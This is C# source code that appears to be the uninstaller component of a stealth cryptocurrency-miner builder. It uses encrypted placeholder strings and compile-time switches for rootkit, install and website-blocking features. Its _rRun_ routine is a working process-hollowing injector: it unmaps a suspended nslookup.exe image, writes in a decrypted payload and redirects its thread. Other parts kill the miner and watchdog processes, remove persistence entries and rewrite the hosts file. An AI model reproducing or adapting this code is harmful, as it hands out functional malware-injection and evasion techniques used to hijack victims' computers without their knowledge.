using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Resources;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.Collections.Generic;
using System.Management;
#if DefDebug
using System.Windows.Forms;
#endif

public partial class _rUninstaller_
{
    public static string _rbD_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#LIBSPATH"));
    public static string _rbD2_ = (Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + _rGetString_("#WATCHDOGPATH"));


    public static void Main()
    {
#if DefRootkit
        try
        {
            using (var _rarchive_ = new ZipArchive(new MemoryStream(_rGetTheResource_("#RESRKU"))))
            {
                foreach (ZipArchiveEntry _rentry_ in _rarchive_.Entries)
                {
                    if (_rentry_.FullName.Contains("st"))
                    {
                        using (var _rstreamdata_ = _rentry_.Open())
                        {
                            using (var _rms_ = new MemoryStream())
                            {
                                _rstreamdata_.CopyTo(_rms_);
                                _rRun_(_rms_.ToArray(), Path.Combine(Environment.GetEnvironmentVariable(_rGetString_("#SYSTEMROOT")), _rGetString_("#NSLOOKUP")), null);
                            }
                        }
                    }
                }
            }  
        }
        catch(Exception ex){
#if DefDebug
        MessageBox.Show("RK: " + ex.ToString());
#endif
        }
#endif

#if DefInstall
        try
        {
            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOG")))
            {
                proc.Kill();
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U1: " + Environment.NewLine + ex.ToString());
#endif
        }

        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
            {
                if (key != null)
                {
                    key.DeleteValue(Path.GetFileNameWithoutExtension(PayloadPath));
                }
            }
        }
        catch {}

        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "cmd",
                Arguments = "/c schtasks /delete /f /tn " + "\"" + Path.GetFileNameWithoutExtension(PayloadPath) + "\"" + " & exit",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
            });
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U3: " + Environment.NewLine + ex.ToString());
#endif
        }

#endif

        try
        {
            var _rarg1_ = new ConnectionOptions();
            _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg2_ = new ManagementScope(@"\root\cimv2", _rarg1_);
            _rarg2_.Connect();

            var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
            foreach (ManagementObject MemObj in _rarg3_)
            {
                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")) || MemObj["CommandLine"].ToString().Contains(_rGetString_("#WATCHDOGID"))))
                {
                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
                }
            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("U4: " + Environment.NewLine + ex.ToString());
#endif
        }

        Thread.Sleep(3000);
        try
        {
            Directory.Delete(_rbD_, true);
            Directory.Delete(_rbD2_, true);
#if DefInstall
            File.Delete(PayloadPath);
#endif
        }
        catch { }

#if DefBlockWebsites
        try
        {
            string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), _rGetString_("#HOSTSPATH"));
            List<string> _rhostscontent_ = new List<string>(File.ReadAllLines(_rhostspath_));

            string[] _rdomainset_ = new string[] { DOMAINSET };
            for (int i = _rhostscontent_.Count - 1; i >= 0; i--)
            {
                foreach (string _set_ in _rdomainset_)
                {
                    if (_rhostscontent_[i].Contains(" " + _set_))
                    {
                        _rhostscontent_.RemoveAt(i);
                        break;
                    }
                }
            }
            File.WriteAllLines(_rhostspath_, _rhostscontent_.ToArray());
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("M0.5: " + Environment.NewLine + ex.ToString());
#endif
        }
#endif
        Environment.Exit(0);
    }

    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }

    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
    {
        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
        using (var _rarg7_ = new MemoryStream())
        {
            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
            {
                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
                _rarg8_.Close();
            }

            return _rarg7_.ToArray();
        }
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            });
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }

#if DefRootkit
    public static byte[] _rGetTheResource_(string _rarg1_)
    {
        var MyResource = new System.Resources.ResourceManager("#RESPARENT", Assembly.GetExecutingAssembly());
        return _rAESMethod_((byte[])MyResource.GetObject(_rarg1_));
    }

    [DllImport("kernel32.dll")]
    private static extern bool CreateProcess(string _rarg1_,
                                                 string _rarg2_,
                                                 IntPtr _rarg3_,
                                                 IntPtr _rarg4_,
                                                 bool _rarg5_,
                                                 uint _rarg6_,
                                                 IntPtr _rarg7_,
                                                 string _rarg8_,
                                                 byte[] _rarg9_,
                                                 byte[] _rarg1_0);

    [DllImport("kernel32.dll")]
    private static extern long VirtualAllocEx(long _rarg1_,
                                              long _rarg2_,
                                              long _rarg3_,
                                              uint _rarg4_,
                                              uint _rarg5_);

    [DllImport("kernel32.dll")]
    private static extern long WriteProcessMemory(long _rarg1_,
                                                  long _rarg2_,
                                                  byte[] _rarg3_,
                                                  int _rarg4_,
                                                  long _rarg5_);

    [DllImport("ntdll.dll")]
    private static extern uint ZwUnmapViewOfSection(long _rarg1_,
                                                    long _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(long _rarg1_,
                                                IntPtr _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(long _rarg1_,
                                                IntPtr _rarg2_);

    [DllImport("kernel32.dll")]
    private static extern uint ResumeThread(long _rarg1_);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(long _rarg1_);

    public static void _rRun_(byte[] _rarg1_, string _rarg2_, string _rarg3_)
    {
        int _rarg4_ = Marshal.ReadInt32(_rarg1_, 0x3c);

        long _rarg5_ = Marshal.ReadInt64(_rarg1_, _rarg4_ + 0x18 + 0x18);

        byte[] _rarg6_ = new byte[0x18];

        IntPtr _rarg7_ = new IntPtr(16 * ((Marshal.AllocHGlobal(0x4d0 + (16 / 2)).ToInt64() + (16 - 1)) / 16));

        Marshal.WriteInt32(_rarg7_, 0x30, 0x0010001b);

        CreateProcess(null, _rarg2_ + (!string.IsNullOrEmpty(_rarg3_) ? " " + _rarg3_ : ""), IntPtr.Zero, IntPtr.Zero, true, 0x4u, IntPtr.Zero, Path.GetDirectoryName(_rarg2_), new byte[0x68], _rarg6_);
        long _rarg8_ = Marshal.ReadInt64(_rarg6_, 0x0);
        long _rarg9_ = Marshal.ReadInt64(_rarg6_, 0x8);

        ZwUnmapViewOfSection(_rarg8_, _rarg5_);
        VirtualAllocEx(_rarg8_, _rarg5_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x038), 0x3000, 0x40);
        WriteProcessMemory(_rarg8_, _rarg5_, _rarg1_, Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x03c), 0L);

        for (short i = 0; i < Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x2); i++)
        {
            byte[] _rarg1_0 = new byte[0x28];
            Buffer.BlockCopy(_rarg1_, _rarg4_ + (0x18 + Marshal.ReadInt16(_rarg1_, _rarg4_ + 0x4 + 0x10)) + (0x28 * i), _rarg1_0, 0, 0x28);

            byte[] _rarg1_1 = new byte[Marshal.ReadInt32(_rarg1_0, 0x010)];
            Buffer.BlockCopy(_rarg1_, Marshal.ReadInt32(_rarg1_0, 0x014), _rarg1_1, 0, _rarg1_1.Length);

            WriteProcessMemory(_rarg8_, _rarg5_ + Marshal.ReadInt32(_rarg1_0, 0x00c), _rarg1_1, _rarg1_1.Length, 0L);
        }

        GetThreadContext(_rarg9_, _rarg7_);

        WriteProcessMemory(_rarg8_, Marshal.ReadInt64(_rarg7_, 0x88) + 16, BitConverter.GetBytes(_rarg5_), 8, 0L);

        Marshal.WriteInt64(_rarg7_, 0x80, _rarg5_ + Marshal.ReadInt32(_rarg1_, _rarg4_ + 0x18 + 0x10));

        SetThreadContext(_rarg9_, _rarg7_);
        ResumeThread(_rarg9_);

        Marshal.FreeHGlobal(_rarg7_);
        CloseHandle(_rarg8_);
        CloseHandle(_rarg9_);
    }
#endif
}